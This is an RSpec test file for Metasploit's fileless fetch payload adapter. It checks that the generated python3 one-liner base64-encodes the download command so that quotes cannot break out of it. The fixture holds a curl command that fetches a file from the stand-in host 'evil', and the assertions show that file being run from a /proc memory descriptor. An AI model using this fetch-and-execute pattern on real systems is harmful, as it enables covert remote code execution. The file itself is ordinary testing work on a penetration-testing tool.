require 'spec_helper'

RSpec.describe Msf::Payload::Adapter::Fetch::Fileless do
  let(:harness_class) do
    Class.new do
      include Msf::Payload::Adapter::Fetch::Fileless
    end
  end

  subject(:harness) { harness_class.new }

  # Representative of the get_file_cmd curl/wget build when FETCH dynamic_arch is
  # enabled: it contains a literal single quote plus other shell metacharacters
  # ($, &). Embedded unencoded, that quote previously closed the python3 -c '...'
  # argument early and broke out into raw shell syntax.
  let(:get_file_cmd) { 'curl -so /tmp/x http://evil/uri?arch=$(uname -m)\&endian=$(printf %d \'$(head -c6 /bin/sh|tail -c1))' }

  describe '#_generate_fileless_python' do
    subject(:cmd) { harness._generate_fileless_python(get_file_cmd) }

    it 'never embeds get_file_cmd verbatim in the generated one-liner' do
      expect(cmd).not_to include(get_file_cmd)
    end

    it 'base64-decodes back to the exact original get_file_cmd' do
      encoded = cmd[/b64decode\("([^"]+)"\)/, 1]
      expect(encoded).not_to be_nil
      expect(Base64.strict_decode64(encoded)).to eq(get_file_cmd)
    end

    it 'keeps the python -c argument as a single balanced single-quoted string' do
      # The only single quotes in the whole command must be the two delimiting
      # `python3 -c '...'`. If get_file_cmd's own single quote (or any other
      # metacharacter) leaked in unencoded, this count would be higher and the
      # command would break out of the intended python argument.
      expect(cmd.count("'")).to eq(2)
      expect(cmd).to match(/\Apython3 -c '.*'\z/)
    end

    it 'decodes and runs get_file_cmd through the shell via os.system' do
      expect(cmd).to include('os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";{get_file_cmd};$f&")')
    end
  end

  describe '#_generate_fileless_bash_search' do
    subject(:cmd) { harness._generate_fileless_bash_search(get_file_cmd) }

    it 'embeds get_file_cmd directly, since the surrounding script text is unquoted' do
      expect(cmd).to include("if $(#{get_file_cmd} >/dev/null)")
    end
  end

  describe '#_generate_fileless_shell' do
    subject(:cmd) { harness._generate_fileless_shell(get_file_cmd, 'mipsle') }

    it 'embeds get_file_cmd directly, since the surrounding script text is unquoted' do
      expect(cmd).to include("then if $(#{get_file_cmd} >/dev/null)")
    end
  end
end
